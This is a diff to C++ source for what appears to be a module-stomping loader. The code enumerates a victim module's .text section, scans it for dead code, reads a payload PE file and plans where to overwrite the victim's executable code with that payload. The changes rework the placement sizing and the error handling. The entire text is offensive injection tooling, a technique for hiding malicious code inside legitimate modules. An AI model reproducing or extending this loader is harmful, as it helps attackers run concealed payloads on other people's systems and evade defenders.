@@ -27,32 +27,29 @@ int main(int argc, char** argv)
     }
     fprintf(stdout, "stage=ENUMERATE victim=%ls text_rva=0x%x text_vsize=0x%x\n",
         vic.name.c_str(), vic.text_rva, vic.text_vsize);
-    if (!stomp::AnalyzeDeadCode(vic)) {
-        fprintf(stdout, "stage=DEAD_CODE_SCAN dead_funcs=0 (exec-gap placement still allowed)\n");
-    } else {
-        fprintf(stdout, "stage=DEAD_CODE_SCAN dead_funcs=%zu\n", vic.dead_funcs.size());
+  if (!stomp::AnalyzeDeadCode(vic)) {
+        fprintf(stderr, "[!] AnalyzeDeadCode failed dead_funcs=%zu\n", vic.dead_funcs.size());
+        return 3;
     }
+    fprintf(stdout, "stage=DEAD_CODE_SCAN dead_funcs=%zu\n", vic.dead_funcs.size());
     std::vector<uint8_t> payload = ReadBin(argv[2]);
     if (payload.empty()) {
         fprintf(stderr, "[!] payload read failed %s\n", argv[2]);
         return 4;
     }
     uint32_t sizeOfImage = stomp::PeSizeOfImage(payload);
-    uint32_t skip = stomp::PeFirstSectionRva(payload);
-    if (!sizeOfImage || !skip || skip >= sizeOfImage) {
+    if (!sizeOfImage) {
         fprintf(stderr, "[!] invalid payload PE\n");
         return 4;
     }
     stomp::StompPlan plan{};
     plan.victim_name = vic.name;
-    plan.header_skip = skip;
-    uint32_t span = sizeOfImage - skip;
-    if (!stomp::PlanPlacement(vic, span, plan)) {
+    if (!stomp::PlanPlacement(vic, sizeOfImage, plan)) {
         uint32_t textEnd = vic.text_rva + vic.text_vsize;
         uint32_t tail = (textEnd > vic.text_used_high_rva)
             ? textEnd - vic.text_used_high_rva : 0;
-        fprintf(stderr, "[!] PlanPlacement failed need=0x%x (image=0x%x skip=0x%x) dead=%zu text_high=0x%x tail~0x%x max_cc=0x%x max_safe=0x%x\n",
-            span, sizeOfImage, skip, vic.dead_funcs.size(), vic.text_used_high_rva, tail,
+        fprintf(stderr, "[!] PlanPlacement failed need=0x%x dead=%zu text_high=0x%x tail~0x%x max_cc=0x%x max_safe=0x%x\n",
+            sizeOfImage, vic.dead_funcs.size(), vic.text_used_high_rva, tail,
             stomp::MaxTextCcRun(vic), stomp::MaxSafeTextSpan(vic, sizeOfImage));
         return 5;
     }
